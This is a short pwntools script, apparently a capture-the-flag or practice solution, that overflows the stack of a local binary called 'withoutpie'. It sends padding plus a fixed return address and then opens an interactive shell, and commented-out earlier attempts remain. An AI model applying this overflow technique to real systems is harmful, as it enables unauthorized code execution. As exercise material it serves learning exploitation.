from pwn import *

""" payload = b"A" * 0x71 + p32(0x08049182) """

""" p = process("./withoutpie") """

""" p.sendline(payload)

p.interactive()

payload = b"A" * (0x71+0x4) + p32(0x08049182)

p = process("./withoutpie")

p.sendline(payload)

p.interactive() """

binary = context.binary = ELF('./withoutpie')
p= process(binary.path)

exploit_data = b'A' * 0x71 + p32(0x08049182)
p.sendline(exploit_data)

print(exploit_data)
p.recv()
p.interactive()

